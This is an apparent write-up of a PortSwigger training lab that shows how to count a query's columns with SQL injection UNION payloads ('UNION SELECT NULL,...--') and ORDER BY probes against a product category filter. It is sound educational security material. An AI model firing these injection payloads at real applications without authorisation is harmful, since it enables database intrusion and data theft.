# SQL Injection UNION Attack — Determining the Number of Columns


**Lab:** SQL injection UNION attack, determining the number of columns returned by the query

**Difficulty:** Practitioner

**Status:** Solved ✅


## Goal


Determine the **number of columns** returned by the original SQL query using a `UNION` attack.


The vulnerability exists in the **product category filter**, and the query results are reflected in the 

application's response.


---


## 1. UNION Requirement


For a `UNION` query to work:



> The number of columns in both `SELECT` statements must be the same.



For example:



```sql

SELECT column1, column2, column3 FROM products

UNION

SELECT NULL, NULL, NULL

```



Both queries return **3 columns**.



---



## 2. Use NULL to Determine the Column Count



Start with one `NULL`:



```sql

' UNION SELECT NULL--

```



If it produces an error, increase the number of `NULL` values:



```sql


' UNION SELECT NULL,NULL--

```



Then:


```sql

' UNION SELECT NULL,NULL,NULL--

```


Continue until the query succeeds.


### Result


The successful payload was:


```sql

' UNION SELECT NULL,NULL,NULL--

```

Therefore:



```text

Number of columns = 3

```

---


## 3. Why NULL?


`NULL` is useful because it can generally be used with different data types.


At this stage, we don't care about retrieving actual data. We only want to determine the **number of columns**.


---


## 4. Alternative Method — ORDER BY


Another way to determine the number of columns is using `ORDER BY`:


```sql

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--
' ORDER BY 4--

```


When the column number becomes invalid, the previous number indicates the number of columns.


However, **this lab specifically focuses on using a UNION attack with NULL values**.

---



## Attack Flow



```text
SQL Injection

     ↓

UNION SELECT

     ↓

Start with NULL

     ↓

Increase number of NULLs

     ↓

Successful query

     ↓

3 NULL values

     ↓

3 columns

```


## Key Takeaway 🧠


**The number of `NULL` values in the successful UNION query = the number of columns returned by the original query.**


```sql

' UNION SELECT NULL,NULL,NULL--

```



→ **3 columns** ✅

[PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks?utm_source=chatgpt.com)
